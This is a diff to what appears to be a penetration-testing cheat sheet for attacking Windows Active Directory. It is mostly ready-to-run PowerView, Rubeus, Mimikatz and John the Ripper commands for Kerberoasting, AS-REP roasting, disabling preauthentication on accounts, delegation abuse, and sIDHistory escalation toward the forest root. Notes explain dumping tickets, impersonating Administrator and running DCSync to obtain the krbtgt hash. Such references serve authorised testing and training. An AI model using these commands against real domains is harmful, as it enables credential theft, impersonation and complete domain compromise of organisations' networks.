@@ -26,12 +26,23 @@
 ### Kerberoasting
 ---
 ```powershell
+- PowerView:
 # Standard AD User. Get Domain Users SPN. Users that are for services
 C:> . .\PowerView.ps1
 C:> Get-DomainUser -SPN
 # We require to use the 'serviceprincipalname'
 
-# Using AD Module
+# Get every available SPN account, request a TGS and dump its hash
+C:> Invoke-Kerberoast
+
+# Request TGS for a single account
+C:> Request-SPNTicket
+
+# Export all tickets
+C:> Invoke-Mimikatz -Command '"kerberos::list /export"'
+```
+- AD Module
+```powershell
 C:> Get-ADUser -Filter {ServicePrincipalName ne ""$null ""} -Properties ServicePrincipalName
 ```
 #### Using `Rubeus.exe`
@@ -45,6 +56,9 @@ C:> Rubeus.exe kerberoast /user:<user> /simple /outfile:hashes.txt
 # Accounts supporting only RC4 (Gives errors!)
 C:> Rubeus.exe kerberoast /stats /rc4opsec
 C:> Rubeus.exe kerberoast /user:<user> /simple /rc4opsec
+
+# Specifying the authentication credentials 
+C:> Rubeus.exe kerberoast /outfile:<fileName> /domain:<domain> /creduser:<user> /credpassword:<pass>
 
 # Kerberoast all possible accounts
 C:> Rubeus.exe kerberoast /outfile:hashes.txt                  
@@ -68,6 +82,7 @@ C:> python.exe .\tgsrepcrack.py .\<wordlist>.txt .\<exported_file_from_mimikatz>
 ```
 ### Targeted Kerberoasting AS-REPs
 ---
+For a domain user with kerberos preauthentication disabled, a valid TGT for this account can be requested without even having domain credentials. Then bruteforce the encripted passwd in the TGT.
 #### Enumerating accounts with Kerberos Preauth disabled
 ```powershell
 # PowerView
@@ -78,19 +93,33 @@ C:> Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequ
 ```
 #### Disable Kerberos Preauth
 ```powershell
-C:> Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose
-C:> Get-DomainUser -PreauthNotRequired -Verbose    # Check
+# Deisable it
+C:> Set-DomainObject -Identity <user> -XOR @{useraccountcontrol=4194304} -Verbose
+
+# Check again
+C:> Get-DomainUser -PreauthNotRequired -Verbose  
 ``` 
 #### ASREPRoast 
 ```powershell
-# Request Encrypted AS-REP for Offline Brute Force
-C:> Get-ASREPHash -UserName <user> -Verbose
-
 # Enumerate Users with KErberos preauth disabled
 C:> Invoke-ASREPRoast -Verbose
 
+# Request Encrypted AS-REP for Offline Brute Force
+C:> Get-ASREPHash -UserName <user> -Verbose
+
 # Crack using JTR
 C:> john.exe --wordlist=C:\10k-worst-pass.txt C:\asrephashes.txt
+```
+#### Rubeus
+```powershell
+# Roast all domain users
+Rubeus.exe asreproast /format:<john or hashcat> /domain:<domain> /outfile:<file>
+
+# Specific user
+Rubeus.exe asreproast /user:<user> /format:<john or hashcat> /domain:<domain> /outfile:<file>
+
+# Users from a OU
+Rubeus.exe asreproast /ou:<OU_name> /format:<john or hashcat> /domain:<domain> /outfile:<file>
 ```
 ### Targeted Kerberoasting Set SPN
 ---
@@ -105,21 +134,20 @@ C:> Get-DomainUser -Identity <user> | select serviceprincipalname
 # Set SPN for the user
 C:> Set-DomainObject -Identity <user> | Set @{serviceprincipalname='ops/whatever1'}
 
-# Kerberoast the user
+# Kerberoast the user with Rubeus
 C:> Rubeus.exe kerberoast /outfile:targetedhashes.txt
 C:> john.exe /wordlist=C:\wordlist.txt C:\targetedhashes.txt
 ```
 
-### Kerberos Delegation
----
-
-#### Uncostrained Delegation
+### Uncostrained Delegation
+With DA access to a host with Unconstrained Delegation enabled, when some user connects, the user TGT can be taken to be able to impersonate passig the ticket (ptt).
 ```powershell
 # Find Server with Unconstraided Delegation Enabled
 C:> . C:\AD\Tools\PowerView.ps1
 C:> Get-DomainComputer -Unconstrained | select -ExpandProperty name
-<host1>
-<host_n>
+
+# Monitor incoming sessions on host
+C:> Invoke-UserHunter -ComputerName <host> -Poll <seconds> -UserName <user> -Delay <interval> -Verbose
 
 # Compromise the server and wait uuser to connect to server and then dump tokens on .kirbi files
 C:> Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
@@ -152,7 +180,7 @@ C:> Rubeus.exe ptt /ticket:<Base64EncodedTicket>
 # At this point we get a ticket for the DC User
 # From here, a DC-Sync attack to DC to get krbtgt and also to enterprise DC.
 ```
-#### Constrained Delegation
+### Constrained Delegation
 ```powershell
 # Get users with Constraied delegation
 C:> . .\PowerView.ps1
@@ -169,14 +197,14 @@ C:> Rubeus.exe s4u /user:<user> /aes256:<user_aes_hash> /impersonateuser:Adminis
 # Get Computer Accounts with Constrained Delegation
 C:> Get-DomainComputer -TrustedToAuth
 
-# Impersonate User Administrator using the host account
+# Pass the ticket to impersonate User Administrator using the host account
 #   Using LDAP as the altservice, will allow to do a dcsync to dump krbgtg hash
 C:> Rubeus.exe s4u /user:<host_account>$ /aes256:<host_aes_hash> /impersonateuser:Administrator 
-                   /msdsspn:time/<host_Fqdn> /altservice:ldap /ptt
+                   /msdsspn:time/<host_Fqdn> /altservice:<SPN: http|host|ldap|...> /ptt
 ```
-##### Resource Based RBCD
-- Control over an object which has SPN configured
-- Write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity
+#### Resource Based RBCD
+Required control over an object which has SPN configured, write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity required. 
+With required privileges on a computer object, it can be abused and impersonate ourselves as any user of the domain to it.
 ```powershell
 # Use BloodHound to get Users permissions over hosts for clues
 
@@ -209,6 +237,7 @@ Not Worth the Effort.
 ### Escalate Across Trusts
 ---
 #### Child to Parent using sIDHistory
+If we manage to compromise a child domain of a forest and SID filtering isn't enabled (most of the times is not), we can abuse it to privilege escalate to Domain Administrator of the root domain of the forest. This is possible because of the SID History field on a kerberos TGT ticket, that defines the "extra" security groups and privileges.
 ```powershell
 #`sIDHistory` (sids below) is a user attribute designed for scenarios where a user is moved from one domain to another. 
 # When a user's domain is changed, they get a new SID and the old SID is added to `sIDHistory`
